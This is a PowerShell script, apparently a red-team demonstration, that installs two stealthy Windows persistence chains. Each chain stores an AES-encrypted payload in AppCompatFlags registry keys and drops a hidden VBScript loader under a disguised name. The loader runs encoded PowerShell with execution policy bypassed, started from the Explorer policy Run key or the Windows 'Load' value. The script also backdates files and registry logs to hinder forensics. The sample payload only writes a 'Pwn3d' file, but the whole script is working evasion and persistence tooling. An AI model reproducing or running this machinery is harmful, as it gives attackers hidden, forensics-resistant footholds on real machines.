Write-Host "[*] Starting HKCU showdown persistence installation..." -ForegroundColor Cyan
Write-Host "[*] This script installs 2 independent chains." -ForegroundColor Cyan

# PRIMARY CHAIN
Write-Host "`n[PRIMARY] Building chain 1..." -ForegroundColor Magenta

# STEP 1 - Define plaintext payload
$plainPayload = "Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Force"

# STEP 2 - AES-256 encrypt the payload (Layer 4)
Write-Host "[PRIMARY] Encrypting payload with AES-256..." -ForegroundColor Cyan

$aes1 = [System.Security.Cryptography.Aes]::Create()
$aes1.KeySize = 256; $aes1.BlockSize = 128
$aes1.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes1.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes1.GenerateKey(); $aes1.GenerateIV()
$enc1 = $aes1.CreateEncryptor()
$payloadBytes1 = [System.Text.Encoding]::UTF8.GetBytes($plainPayload)
$encrypted1 = $enc1.TransformFinalBlock($payloadBytes1, 0, $payloadBytes1.Length)
$e64_1 = [Convert]::ToBase64String($encrypted1)
$k64_1 = [Convert]::ToBase64String($aes1.Key)
$i64_1 = [Convert]::ToBase64String($aes1.IV)

Write-Host "[PRIMARY] Payload encrypted." -ForegroundColor Green

# STEP 3 - Store encrypted blob in AppCompatFlags\Layers (Layer 3b)
Write-Host "[PRIMARY] Storing encrypted blob in AppCompatFlags\Layers..." -ForegroundColor Cyan

$storagePath1 = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
if (-not (Test-Path $storagePath1)) { New-Item -Path $storagePath1 -Force | Out-Null }
New-ItemProperty -Path $storagePath1 -Name "CacheData" -Value "$e64_1|$k64_1|$i64_1" -PropertyType String -Force | Out-Null

Write-Host "[PRIMARY] Blob stored at: $storagePath1\CacheData" -ForegroundColor Green

# STEP 4 - Build the decryptor loader script
$loaderScript1 = @'
$b=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers' -Name 'CacheData').CacheData
$x=$b -split '\|'
$a=[System.Security.Cryptography.Aes]::Create()
$a.KeySize=256;$a.BlockSize=128
$a.Mode=[System.Security.Cryptography.CipherMode]::CBC
$a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
$a.Key=[Convert]::FromBase64String($x[1])
$a.IV=[Convert]::FromBase64String($x[2])
$d=$a.CreateDecryptor()
$n=[Convert]::FromBase64String($x[0])
$m=[System.Text.Encoding]::UTF8.GetString($d.TransformFinalBlock($n,0,$n.Length))
Invoke-Expression $m
'@

# STEP 5 - Base64-encode the loader for -EncodedCommand (Layer 2b)
$encoded1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($loaderScript1))

# STEP 6 - Drop a VBScript wrapper (Layer 2a — zero visible window)
Write-Host "[PRIMARY] Dropping VBScript wrapper to WebCache folder..." -ForegroundColor Cyan

$vbsPath1 = "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\mshelper.vbs"
if (-not (Test-Path (Split-Path $vbsPath1))) {
    New-Item -Path (Split-Path $vbsPath1) -ItemType Directory -Force | Out-Null
}
$vbsContent1  = "Set sh = CreateObject(""WScript.Shell"")" + [Environment]::NewLine
$vbsContent1 += "sh.Run ""powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encoded1"", 0, False"
Set-Content -Path $vbsPath1 -Value $vbsContent1 -Encoding ASCII
(Get-Item -Path $vbsPath1 -Force).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System

Write-Host "[PRIMARY] VBS wrapper dropped and hidden: $vbsPath1" -ForegroundColor Green

# STEP 7 - Write trigger to Policies\Explorer\Run (Layer 1 + non-standard key)
Write-Host "[PRIMARY] Writing to Policies\Explorer\Run (non-standard trigger key)..." -ForegroundColor Cyan

$triggerPath1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
if (-not (Test-Path $triggerPath1)) { New-Item -Path $triggerPath1 -Force | Out-Null }
New-ItemProperty -Path $triggerPath1 -Name "WindowsUpdate" -Value "wscript.exe //B //Nologo `"$vbsPath1`"" -PropertyType String -Force | Out-Null

Write-Host "[PRIMARY] Trigger installed: $triggerPath1\WindowsUpdate" -ForegroundColor Green


# BACKUP CHAIN
Write-Host "`n[BACKUP] Building chain 2..." -ForegroundColor Magenta

# STEP 8 - Generate a completely separate AES key and IV for the backup chain
Write-Host "[BACKUP] Encrypting payload with separate AES-256 key..." -ForegroundColor Cyan

$aes2 = [System.Security.Cryptography.Aes]::Create()
$aes2.KeySize = 256; $aes2.BlockSize = 128
$aes2.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes2.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes2.GenerateKey(); $aes2.GenerateIV()
$enc2 = $aes2.CreateEncryptor()
$payloadBytes2 = [System.Text.Encoding]::UTF8.GetBytes($plainPayload)
$encrypted2 = $enc2.TransformFinalBlock($payloadBytes2, 0, $payloadBytes2.Length)
$e64_2 = [Convert]::ToBase64String($encrypted2)
$k64_2 = [Convert]::ToBase64String($aes2.Key)
$i64_2 = [Convert]::ToBase64String($aes2.IV)

Write-Host "[BACKUP] Payload encrypted with separate key." -ForegroundColor Green

# STEP 9 - Store backup blob in AppCompatFlags\Custom
Write-Host "[BACKUP] Storing encrypted blob in AppCompatFlags\Custom..." -ForegroundColor Cyan

$storagePath2 = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"
if (-not (Test-Path $storagePath2)) { New-Item -Path $storagePath2 -Force | Out-Null }
New-ItemProperty -Path $storagePath2 -Name "CompatData" -Value "$e64_2|$k64_2|$i64_2" -PropertyType String -Force | Out-Null

Write-Host "[BACKUP] Blob stored at: $storagePath2\CompatData" -ForegroundColor Green

# STEP 10 — Build backup loader (reads from Custom key instead of Layers key)
$loaderScript2 = @'
$b=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom' -Name 'CompatData').CompatData
$x=$b -split '\|'
$a=[System.Security.Cryptography.Aes]::Create()
$a.KeySize=256;$a.BlockSize=128
$a.Mode=[System.Security.Cryptography.CipherMode]::CBC
$a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
$a.Key=[Convert]::FromBase64String($x[1])
$a.IV=[Convert]::FromBase64String($x[2])
$d=$a.CreateDecryptor()
$n=[Convert]::FromBase64String($x[0])
$m=[System.Text.Encoding]::UTF8.GetString($d.TransformFinalBlock($n,0,$n.Length))
Invoke-Expression $m
'@
$encoded2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($loaderScript2))

# STEP 11 — Drop backup VBS wrapper in IE UserData folder
Write-Host "[BACKUP] Dropping VBScript wrapper to IE UserData folder..." -ForegroundColor Cyan

$vbsPath2 = "$env:APPDATA\Microsoft\Internet Explorer\UserData\iehelper.vbs"
if (-not (Test-Path (Split-Path $vbsPath2))) {
    New-Item -Path (Split-Path $vbsPath2) -ItemType Directory -Force | Out-Null
}
$vbsContent2  = "Set sh = CreateObject(""WScript.Shell"")" + [Environment]::NewLine
$vbsContent2 += "sh.Run ""powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encoded2"", 0, False"
Set-Content -Path $vbsPath2 -Value $vbsContent2 -Encoding ASCII
(Get-Item -Path $vbsPath2 -Force).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System

Write-Host "[BACKUP] VBS wrapper dropped and hidden: $vbsPath2" -ForegroundColor Green

# STEP 12 — Write trigger to Windows NT\CurrentVersion\Windows "Load" value
Write-Host "[BACKUP] Writing to Windows NT\...\Windows Load value (legacy trigger key)..." -ForegroundColor Cyan

$triggerPath2 = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
if (-not (Test-Path $triggerPath2)) { New-Item -Path $triggerPath2 -Force | Out-Null }
New-ItemProperty -Path $triggerPath2 -Name "Load" -Value "wscript.exe //B //Nologo `"$vbsPath2`"" -PropertyType String -Force | Out-Null

Write-Host "[BACKUP] Trigger installed: $triggerPath2\Load" -ForegroundColor Green

# TIMESTAMP BACKDATING (Layer 5b)
Write-Host "`n[*] Backdating timestamps (Layer 5b)..." -ForegroundColor Cyan

$backdateTarget = [DateTime]"2023-03-12 08:42:00"

# Backdate both VBS files
foreach ($vbsFile in @($vbsPath1, $vbsPath2)) {
    try {
        $fi = Get-Item -Path $vbsFile -Force -ErrorAction Stop
        $fi.CreationTime = $backdateTarget; $fi.LastWriteTime = $backdateTarget; $fi.LastAccessTime = $backdateTarget
        Write-Host "[*] Backdated: $vbsFile" -ForegroundColor DarkGray
    } catch { Write-Host "[!] Could not backdate: $vbsFile" -ForegroundColor Yellow }
}

# Backdate NTUSER.DAT log files
foreach ($log in @("$env:USERPROFILE\NTUSER.DAT.LOG1", "$env:USERPROFILE\NTUSER.DAT.LOG2")) {
    try {
        $lf = Get-Item -Path $log -Force -ErrorAction Stop
        $lf.LastWriteTime = $backdateTarget; $lf.LastAccessTime = $backdateTarget
        Write-Host "[*] Backdated: $log" -ForegroundColor DarkGray
    } catch { Write-Host "[!] Skipped (locked): $log" -ForegroundColor Yellow }
}

# Backdate parent directories to reduce directory-level timeline signals
foreach ($dir in @(
    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
    "$env:APPDATA\Microsoft\Internet Explorer\UserData"
)) {
    try {
        $di = Get-Item -Path $dir -Force -ErrorAction Stop
        $di.LastAccessTime = $backdateTarget
        Write-Host "[*] Backdated dir: $dir" -ForegroundColor DarkGray
    } catch {}
}

# VERIFICATION
Write-Host "`n[*] Verifying installation..." -ForegroundColor Cyan

$chain1OK = (Get-ItemProperty -Path $triggerPath1 -Name "WindowsUpdate" -ErrorAction SilentlyContinue) -and (Test-Path $vbsPath1)
$chain2OK = (Get-ItemProperty -Path $triggerPath2 -Name "Load" -ErrorAction SilentlyContinue) -and (Test-Path $vbsPath2)

if ($chain1OK) { Write-Host "[+] PRIMARY chain verified." -ForegroundColor Green } else { Write-Host "[-] PRIMARY chain FAILED." -ForegroundColor Red }
if ($chain2OK) { Write-Host "[+] BACKUP chain verified."  -ForegroundColor Green } else { Write-Host "[-] BACKUP chain FAILED."  -ForegroundColor Red }

Write-Host "`n[*] Summary:" -ForegroundColor Yellow
Write-Host "    PRIMARY trigger  : $triggerPath1\WindowsUpdate"         -ForegroundColor Yellow
Write-Host "    PRIMARY storage  : $storagePath1\CacheData (AES-256)"   -ForegroundColor Yellow
Write-Host "    PRIMARY file     : $vbsPath1 (Hidden+System)"           -ForegroundColor Yellow
Write-Host "    BACKUP trigger   : $triggerPath2\Load"                  -ForegroundColor Yellow
Write-Host "    BACKUP storage   : $storagePath2\CompatData (AES-256)"  -ForegroundColor Yellow
Write-Host "    BACKUP file      : $vbsPath2 (Hidden+System)"           -ForegroundColor Yellow
Write-Host "    Timestamps       : Backdated to $backdateTarget"        -ForegroundColor Yellow
Write-Host "    Result on reboot : C:\Users\Public\Documents\pwned.txt = 'Pwn3d'" -ForegroundColor Yellow
